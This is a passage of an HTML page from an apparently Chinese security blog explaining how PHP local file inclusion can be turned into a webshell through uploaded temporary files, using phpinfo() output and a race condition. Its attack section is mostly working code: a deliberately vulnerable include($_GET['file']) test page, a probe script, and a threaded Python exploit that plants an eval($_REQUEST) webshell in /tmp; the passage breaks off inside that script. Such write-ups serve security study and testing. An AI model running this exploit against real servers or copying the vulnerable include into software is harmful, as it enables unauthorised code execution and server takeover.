@@ -1,0 +1,1347 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="LFI PHPINFO OR PHP7 Segment Fault Getshell, Qftm">
+    <meta name="description" content="Maybe a hacker">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>LFI PHPINFO OR PHP7 Segment Fault Getshell | Qftm</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qftm</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qftm</div>
+        <div class="logo-desc">
+            
+            Maybe a hacker
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heartbeat"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">LFI PHPINFO OR PHP7 Segment Fault Getshell</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PHP/">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                            <a href="/tags/LFI/">
+                                <span class="chip bg-color">LFI</span>
+                            </a>
+                        
+                            <a href="/tags/Bypass/">
+                                <span class="chip bg-color">Bypass</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-03-15
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-03-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    4.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    18 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近整理PHP文件包含漏洞姿势的时候，发现一些比较好用的姿势关于本地文件包含漏洞可以利用临时文件包含恶意代码拿到Webshell的一些奇技淫巧，于是打算详细整理一下。</p>
+<h1 id="PHP-LFI"><a href="#PHP-LFI" class="headerlink" title="PHP LFI"></a>PHP LFI</h1><p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p>
+<p>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。</p>
+<p>目前，常见的两种临时文件包含漏洞利用方法主要是：<code>PHPINFO()</code> and <code>PHP7 Segment Fault</code>，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。</p>
+<h1 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h1><p>在了解漏洞利用方式的时候，先来了解一下PHP临时文件的机制</p>
+<h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p>
+<p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p>
+<pre><code>$_FILES[&#39;userfile&#39;][&#39;name&#39;] 客户端文件的原名称。
+$_FILES[&#39;userfile&#39;][&#39;type&#39;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。
+$_FILES[&#39;userfile&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节。
+$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
+$_FILES[&#39;userfile&#39;][&#39;error&#39;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
+$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端存储的临时文件名</code></pre><p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p>
+<h2 id="存储目录"><a href="#存储目录" class="headerlink" title="存储目录"></a>存储目录</h2><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的<code>upload_tmp_dir</code>属性指定，假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p>
+<p>不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p>
+<h3 id="Linux目录"><a href="#Linux目录" class="headerlink" title="Linux目录"></a>Linux目录</h3><p>Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。</p>
+<pre><code>/tmp/</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/image-20200318015325047.png" alt="image-20200318015325047"></p>
+<h3 id="Windows目录"><a href="#Windows目录" class="headerlink" title="Windows目录"></a>Windows目录</h3><p>Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。</p>
+<pre><code>C:/Windows/
+C:/Windows/Temp/</code></pre><h2 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h2><p>存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</p>
+<p>可以通过phpinfo来查看临时文件的信息。</p>
+<h3 id="Linux-Temporary-File"><a href="#Linux-Temporary-File" class="headerlink" title="Linux Temporary File"></a>Linux Temporary File</h3><p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200315214941249-914728519.png" alt></p>
+<h3 id="Windows-Temporary-File"><a href="#Windows-Temporary-File" class="headerlink" title="Windows Temporary File"></a>Windows Temporary File</h3><p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316005553184-950878581.png" alt></p>
+<h1 id="PHPINFO特性"><a href="#PHPINFO特性" class="headerlink" title="PHPINFO特性"></a>PHPINFO特性</h1><p>通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p>
+<p>虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行卡了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。</p>
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>index.php</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+    <span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>phpinfo.php</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li><strong>利用条件</strong></li>
+</ul>
+<pre><code>无   PHPINFO的这种特性源于php自身，与php的版本无关</code></pre><h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><p>编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+files <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"aa.txt"</span><span class="token punctuation">,</span><span class="token string">"ssss"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+url <span class="token operator">=</span> <span class="token string">"http://x.x.x.x/phpinfo.php"</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行脚本向服务器发出请求可以看到回显中有如下内容</p>
+<p><code>Linux</code></p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200315214941249-914728519.png" alt></p>
+<p><code>Windows</code></p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316005553184-950878581.png" alt></p>
+<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>这个时候就需要用到条件竞争，具体原理和过程如下：</p>
+<p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
+<p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
+<p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
+<p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
+<p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
+<p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+<p>（参考ph牛：<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a> ）</p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等</p>
+<p><code>exp.py</code></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token comment" spellcheck="true">#python version 2.7</span>
+
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> socket
+
+<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    TAG <span class="token operator">=</span> <span class="token string">"Security Test"</span>
+    PAYLOAD <span class="token operator">=</span> <span class="token triple-quoted-string string">"""%s\r
+&lt;?php file_put_contents('/tmp/Qftm', '&lt;?php eval($_REQUEST[Qftm])?>')?>\r"""</span> <span class="token operator">%</span> TAG
+    <span class="token comment" spellcheck="true"># PAYLOAD = </span><span class="token triple-quoted-string string">"""%s\r
+    # &lt;?php file_put_contents('/var/www/html/Qftm.php', '&lt;?php eval($_REQUEST[Qftm])?>')?>\r"""</span> <span class="token operator">%</span> TAG
+    REQ1_DATA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r"""</span> <span class="token operator">%</span> PAYLOAD
+    padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">5000</span>
+    REQ1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST /phpinfo.php?a="""</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">""" HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
+HTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
+HTTP_USER_AGENT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
+HTTP_ACCEPT_LANGUAGE: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
+HTTP_PRAGMA: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s"""</span> <span class="token operator">%</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> REQ1_DATA<span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true"># modify this to suit the LFI script</span>
+    LFIREQ <span class="token operator">=</span> <span class="token triple-quoted-string string">"""GET /index.php?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+"""</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+
+    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
+    d <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">while</span> len<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>
+        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>
+        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">17</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">31</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> None
+
+    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> fn
+
+counter <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e
+        self<span class="token punctuation">.</span>lock <span class="token operator">=</span> l
+        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m
+        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args
+
+    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">global</span> counter
+        <span class="token keyword">while</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>
+                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>
+                    <span class="token keyword">return</span>
+                counter <span class="token operator">+=</span> <span class="token number">1</span>
+
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>
+                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>
+                <span class="token keyword">if</span> x<span class="token punctuation">:</span>
+                    <span class="token keyword">print</span> <span class="token string">"\nGot it! Shell created in /tmp/Qftm.php"</span>
+                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
+                <span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>
+    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>
+
+    d <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
+        d <span class="token operator">+=</span> i
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+        <span class="token comment" spellcheck="true"># detect the final chunk</span>
